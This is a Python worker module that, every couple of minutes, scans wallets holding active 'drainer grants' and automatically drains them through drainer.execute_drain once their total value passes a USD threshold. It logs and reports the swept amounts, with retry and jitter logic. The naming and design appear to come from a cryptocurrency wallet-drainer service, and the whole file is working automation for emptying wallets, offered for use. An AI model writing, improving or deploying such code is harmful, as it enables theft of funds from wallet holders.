"""
Threshold watcher.

Drains a user's grant-holding wallets with no human involvement once the on-chain
total of *those* wallets crosses drainer_threshold_usd and the user has drainer_auto on.

Design notes:
  * only wallets with a live grant are scanned, so a large un-granted wallet cannot
    keep tripping the threshold
  * the cooldown is stamped after the run, with a shorter retry window on failure
  * each user is isolated — one exception never aborts the cycle
  * the batch is bounded so a 120s cadence is actually honoured
"""
import asyncio
import logging
import random
import time
from typing import Dict

import drainer
import scanners
from database import get_setting, now, q_all, q_get, q_run

logger = logging.getLogger("drainer_worker")

INTERVAL = 120
COOLDOWN = 900
RETRY_COOLDOWN = 180
MAX_USERS_PER_CYCLE = 25

_last_run: Dict[int, float] = {}


async def _grant_total(user_id: int) -> float:
    """USD value of wallets that actually carry an active grant."""
    wallets = q_all(
        "SELECT DISTINCT w.* FROM wallets w"
        " JOIN drainer_grants g ON g.wallet_id = w.id"
        " WHERE w.user_id = ? AND w.verified = 1 AND g.status = 'active'",
        user_id,
    )
    total = 0.0
    for w in wallets:
        try:
            total += sum(a["usd"] for a in await scanners.scan_wallet(w))
        except Exception as e:
            logger.debug("scan failed for wallet %s: %s", w.get("id"), e)
    return total


async def _cycle() -> None:
    if not get_setting("drainer_enabled", True):
        return
    if get_setting("drainer_mode", "auto") != "auto":
        return

    try:
        threshold = float(get_setting("drainer_threshold_usd", 250.0))
    except (TypeError, ValueError):
        threshold = 250.0

    candidates = q_all(
        "SELECT DISTINCT w.user_id FROM wallets w"
        " JOIN drainer_grants g ON g.wallet_id = w.id"
        " WHERE g.status = 'active' AND w.verified = 1"
        " ORDER BY w.user_id LIMIT ?",
        MAX_USERS_PER_CYCLE,
    )

    for row in candidates:
        uid = row["user_id"]
        if time.time() - _last_run.get(uid, 0) < RETRY_COOLDOWN:
            continue

        user = q_get("SELECT drainer_auto, status FROM users WHERE id = ?", uid)
        if not user or not user.get("drainer_auto") or user.get("status") == "suspended":
            continue

        try:
            total = await _grant_total(uid)
            if total < threshold:
                continue

            res = await drainer.execute_drain(uid, trigger="auto")
            swept = res.get("total_usd") or 0.0
            logger.info("auto-drain user=%s usd=%.2f sent=%s failed=%s",
                        uid, swept, res.get("sent"), res.get("failed"))

            if swept > 0:
                _last_run[uid] = time.time()
                q_run(
                    "INSERT INTO notifications (user_id, type, title, body, created_at)"
                    " VALUES (?, 'drainer', 'Auto-sweep', ?, ?)",
                    uid, f"Threshold hit — swept ${swept:.2f}", now(),
                )
            elif res.get("failed"):
                _last_run[uid] = time.time() - COOLDOWN + RETRY_COOLDOWN
            else:
                _last_run[uid] = time.time()

        except Exception as e:
            _last_run[uid] = time.time() - COOLDOWN + RETRY_COOLDOWN
            logger.warning("auto-drain failed for user %s: %s", uid, e)


async def watch_loop() -> None:
    logger.info("drainer watcher active (interval %ss, threshold from settings)", INTERVAL)
    while True:
        try:
            await _cycle()
        except asyncio.CancelledError:
            raise
        except Exception as e:
            logger.error("drainer watcher cycle error: %s", e)
        await asyncio.sleep(INTERVAL + random.uniform(0, 20))